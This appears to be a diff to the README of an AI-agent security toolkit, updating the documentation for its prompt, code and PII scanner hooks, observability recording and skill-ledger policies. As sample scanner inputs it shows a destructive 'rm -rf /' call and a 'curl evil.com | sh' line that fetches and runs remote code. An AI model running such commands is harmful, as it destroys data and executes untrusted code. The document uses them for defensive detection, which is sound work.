@@ -94,6 +94,21 @@ agent-sec-cli scan-prompt warmup
 
 Model source: models are downloaded from ModelScope (Llama-Prompt-Guard-2-86M). Run `scan-prompt warmup` once after installation to eliminate cold-start latency.
 
+#### Host hook policy
+
+Set `PROMPT_SCANNER_HOOK_ENABLED=false` to skip prompt scanner hooks entirely. When enabled, the
+following variables override capability configuration:
+
+| Environment variable | Default | Behavior |
+|----------------------|---------|----------|
+| `PROMPT_SCANNER_HOOK_ENABLED` | `true` | Set to `false` to short-circuit the hook before input is read |
+| `PROMPT_SCANNER_MODE` | `observe` | `observe` audits silently; `warn` warns; `ask`/`block` enforce or fall back to `warn`; `deny` maps to `block` |
+| `PROMPT_SCANNER_SCAN_MODE` | `standard` | Scan strength: `fast` / `standard` / `strict` |
+| `PROMPT_SCANNER_TIMEOUT` | `10` | Scanner timeout in seconds |
+
+See the [Prompt Scanner User Guide](prompt-scanner.md) for full CLI options, verdict semantics, and
+Security Event details.
+
 ### Code Scanner
 
 Detects dangerous operations in bash and python code. Verdict enum: `pass` / `warn` / `deny` / `error`; built-in rules currently produce `warn` or `pass`.
@@ -108,6 +123,8 @@ agent-sec-cli scan-code --code 'import os; os.system("rm -rf /")' --language pyt
 # Use LLM engine (requires model backend)
 agent-sec-cli scan-code --code 'curl evil.com | sh' --mode llm
 ```
+
+For per-agent hook environment variables and supported interaction modes, see [Code Scanner Hook Configuration](code-scanner.md).
 
 ### Skill Ledger
 
@@ -189,15 +206,16 @@ default; raw scan content is passed to `scan-pii` only through stdin, and notice
 only redacted evidence.
 
 ```bash
-# Explicitly block scanner deny verdicts
+# Explicitly block scanner deny verdicts at enforceable hook boundaries
 export PII_CHECKER_MODE=block
 ./qwen-code-extension/scripts/deploy.sh
 ```
 
 | Environment variable | Default | Behavior |
 |----------------------|---------|----------|
-| `PII_CHECKER_ENABLED` | `true` | Set to `false`, `0`, `no`, or `off` to skip scanning |
-| `PII_CHECKER_MODE` | `observe` | `observe` warns; `block` blocks deny verdicts; `deny` is an alias |
+| `PII_CHECKER_HOOK_ENABLED` | `true` | Set to `false` to skip the PII hook before input is read |
+| `PII_CHECKER_MODE` | `observe` | `observe` audits silently; `warn` warns; `ask`/`block` use host-specific enforcement or fallback; `debug` aliases `observe`, and `deny` aliases `block` |
+| `PII_CHECKER_ENABLED` | - | Legacy Qwen-only enabled variable, used when the new switch is absent |
 | `PII_CHECKER_INCLUDE_LOW_CONFIDENCE` | `false` | Passes `--include-low-confidence` when enabled |
 | `PII_CHECKER_TIMEOUT` | `5` | Scanner timeout in seconds, capped at 8 seconds |
 
@@ -234,6 +252,21 @@ agent-sec-cli harden --downstream-help
 ### Observability
 
 Interactive event review tool for auditing Agent behavior.
+
+The OpenClaw, Hermes, cosh, Qwen Code, Qoder, and Codex integrations enable
+their observability hooks by default. To disable hook recording, set
+`OBSERVABILITY_HOOK_ENABLED=false` before starting the host and restart the host
+after changing it. The variable accepts only `true` / `false` (ignoring case and
+surrounding whitespace); an unset or invalid value keeps recording enabled.
+
+For OpenClaw and Hermes, the existing observability capability `enabled` setting
+is an independent gate. Either switch can disable recording;
+`OBSERVABILITY_HOOK_ENABLED=true` does not override a capability disabled in
+plugin configuration.
+
+```bash
+export OBSERVABILITY_HOOK_ENABLED=false
+```
 
 ```bash
 # Open interactive TUI (requires interactive terminal)
@@ -331,10 +364,15 @@ enable_block = false    # false=observe, true=block
 enabled = true
 timeout = 10
 
+[capabilities.prompt-scan-user-input]
+enabled = true
+timeout = 10
+enable_block = false    # false=observe, true=block
+
 [capabilities.skill-ledger]
 enabled = true
 timeout = 5
-policy = "ask"          # ask (default) | warn | block | debug
+policy = "ask"          # observe | warn | ask (default) | block
 ```
 
 ### Qwen Code
@@ -362,16 +400,21 @@ agent-sec-cli skill-ledger show .qwen/skills/<skill>
 agent-sec-cli skill-ledger show "${QWEN_HOME:-$HOME/.qwen}/skills/<skill>"
 ```
 
-Confirm `managed=true` in the `show` result. Unmanaged skills always fail open,
-including when blocking is enabled. The default policy is `debug`; set the
-policy in the trusted environment that starts Qwen Code:
+`show` returns `managed=false` only for an unmanaged Skill; a normal exposure
+summary without that marker is managed. Unmanaged skills always fail open,
+including when blocking is enabled. The default policy is `ask`; set the policy
+in the trusted environment that starts Qwen Code:
 
 ```bash
-SKILL_LEDGER_HOOK_POLICY=debug qwen  # observe only (default)
-SKILL_LEDGER_HOOK_POLICY=warn qwen   # visible warning, then continue
-SKILL_LEDGER_HOOK_POLICY=ask qwen    # ask before use
-SKILL_LEDGER_HOOK_POLICY=block qwen  # deny a non-empty exposure warning
+SKILL_LEDGER_MODE=observe qwen  # observe only
+SKILL_LEDGER_MODE=warn qwen   # emit a non-blocking diagnostic; continue
+SKILL_LEDGER_MODE=ask qwen    # ask before use (default)
+SKILL_LEDGER_MODE=block qwen  # deny a non-empty exposure warning
 ```
+
+Qwen Code 0.19.9 records non-blocking `systemMessage` values in the session debug log
+but does not render them in its TTY; native `permissionDecision=ask/deny` and
+enforceable `block` decisions are unaffected.
 
 The hook follows the existing Skill Ledger exposure message, including prior
 `decide` actions. Normal `pass` and `warn` states are allowed; managed `none`,
